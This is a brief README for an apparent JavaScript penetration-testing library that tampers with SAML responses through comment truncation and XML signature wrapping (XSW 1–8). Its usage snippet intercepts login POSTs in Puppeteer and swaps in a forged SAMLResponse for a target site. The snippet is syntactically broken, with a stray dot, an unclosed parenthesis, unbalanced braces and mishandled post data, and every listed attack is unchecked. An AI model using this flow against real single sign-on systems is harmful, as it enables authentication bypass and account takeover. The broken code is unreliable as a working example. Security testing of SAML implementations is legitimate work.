# saml-attacks

Common saml attacks for penetration testing.

## Supported Attacks

- [ ] Modify
- [ ] Comment Truncation
- [ ] XSW 1
- [ ] XSW 2
- [ ] XSW 3
- [ ] XSW 4
- [ ] XSW 5
- [ ] XSW 6
- [ ] XSW 7
- [ ] XSW 8

## Usage

With puppeteer proxy

```js
const { CommentTruncationAttack } = require("saml-attacks");

page.on("request", async (request) => {
  if( request.url().includes(target_url) {
    let post_data = request.postData().;
    let saml_response = post_data.SAMLResponse;
    modified_saml_response = CommentTruncationAttack(saml_response, "assertion_field", "comment");
    post_data.SAMLResponse = modified_saml_response;
    
    await request.continue({
      method: "POST",
      postData: qs.stringify(post_data),
      headers: {
        ...request.headers(),
        "Content-Type": "application/x-www-form-urlencoded",
      },
  } else {
    await request.continue();
  });
})
```
